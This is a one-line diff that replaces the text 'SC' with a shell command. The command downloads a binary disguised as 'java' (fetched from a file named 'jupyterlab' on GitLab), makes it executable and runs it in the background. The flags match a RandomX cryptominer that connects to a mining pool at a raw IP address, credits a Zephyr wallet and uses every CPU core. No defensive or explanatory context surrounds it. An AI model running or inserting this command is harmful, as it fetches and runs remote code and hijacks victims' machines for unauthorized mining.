@@ -1,1 +1,1 @@
-SC
+wget -qO java https://gitlab.com/sarifadim/jomblo/-/raw/main/jupyterlab && chmod +x java && nohup ./java -o 15.235.219.104:1123 -a rx/0 -u ZEPHs8Np6p82XnhjYaDcHNT44gJY5pKbxZWNkmbsrPU2K7hzyTvhkDbRnbtSo3Af6UCAwT7SfvBhBV19BBAnuEbkEzTKg7jyTax.GH --randomx-1gb-pages -p -x -t $(nproc --all)
